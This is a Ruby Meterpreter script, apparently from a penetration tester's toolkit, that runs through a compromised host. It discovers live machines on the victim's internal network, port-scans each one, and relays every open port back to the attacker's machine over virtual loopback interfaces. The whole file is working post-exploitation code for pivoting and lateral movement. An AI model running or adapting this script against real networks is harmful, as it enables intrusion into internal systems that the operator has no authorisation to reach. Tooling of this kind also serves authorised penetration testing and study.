# multirelay.rb
#
# meterpreter-script to discovery and relay
# all accesible ports of the target machine
#
# Written by Jose Selvi (jselvi{_at_}pentester.es)
# v.1.1 2011-03-09

@@exec_opts = Rex::Parser::Arguments.new(
        "-h" => [ false, "Help menu" ],
        "-d" => [ false, "Delete relays"]
)

# Clean MR* Interfaces on MSF Machine
def clean_interfaces()
	# clean portfwd
	if client.pfservice
	client.pfservice.each_tcp_relay do |lhost,lport,rhost,rport,opts|
		client.run_cmd("portfwd delete -L #{lhost} -l #{lport} -r #{rhost} -p #{rport}")
	end
	end
	system "ifconfig | egrep 'MR[0-9]+' | cut -f 1 -d ' ' | while read IFACE; do ifconfig $IFACE down; done"
end

# Set MR* Interfaces on MSF Machine
def set_interfaces(ips)
	count = 0
	ips.each do |ip|
	if ip != '127.0.0.1'
		count += 1
		system_cmd = "ifconfig lo:MR#{"%04d" % count} inet #{ip} netmask 255.255.255.255"
		system system_cmd
		print_status system_cmd
	end
	end
end

# For future use
def warning_ips(ips)
	return true
end

# Discovery hosts and ports
def discovery()
	ip_port = []
	# Alive hosts discovery
	temphosts = []
	hosts = []
	oldstdout = $stdout	# Trick for capturing stdout
	$stdout = StringIO.new
	client.run_cmd('run landiscovery')
	temphosts = $stdout.string
	$stdout = oldstdout
	print_status "Alive Hosts:"
	temphosts.split("\n").each do |x|
	if x.match(/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/)
		y = x.chomp
		hosts << y
		print " - #{y}\n"
	end
	end
	hosts << '127.0.0.1'    # Force to scan localhost
	# PostScan each host
	hosts.each do |ip|
		print_status "Scaning #{ip}:"
		oldstdout = $stdout
		$stdout = StringIO.new
		client.run_cmd("run portscan -t #{ip}")
		ports = $stdout.string
		$stdout = oldstdout
		ports.split("\n").each do |x|
			port = x.chomp
			if port.match(/^[0-9]+$/)
				ip_port << "#{ip}:#{port}"
				print " - #{port}\n"
			end
		end
	end
	$stdout = oldstdout	# Restore stdout
	return ip_port
end

# MultiRelay
def multirelay_portfwd(ip_port)
	ip_port.each do |x|
		v = x.split(':')
		ip = v[0]
		port = v[1]
		portfwd_cmd = "portfwd add -L #{ip} -l #{port} -r #{ip} -p #{port}"
		print_status portfwd_cmd
		client.run_cmd(portfwd_cmd)
	end
end


# Parse Arguments
@@exec_opts.parse(args) { |opt, idx, val|
        case opt
        when "-h"
		print_line "Meterpreter Script for MultiRelay."
		print_line(@@exec_opts.usage)
		raise Rex::Script::Completed
        when "-d"
		print_line "Deleting relays..."
		clean_interfaces()
		raise Rex::Script::Completed
        end
}

# Main
print_status "MULTIRELAY START"
print_status "STEP 0: CLEAN INTERFACES"
clean_interfaces()
print_status "STEP 1: PORT DISCOVERY"
ip_port = discovery()
ips = []
ip_port.each do |x|
	host = x.split(':')[0]
	ips = ips | [host]
end
print_status "STEP 2: SET VIRTUAL INTERFACES"
if not warning_ips(ips)
	print_status "MULTIRELAY ABORTED"
	raise Rex::Script::Completed
end
set_interfaces(ips)
print_status "STEP 3: TCP PORT RELAY"
multirelay_portfwd(ip_port)
print_status "MULTIRELAY DONE"
raise Rex::Script::Completed
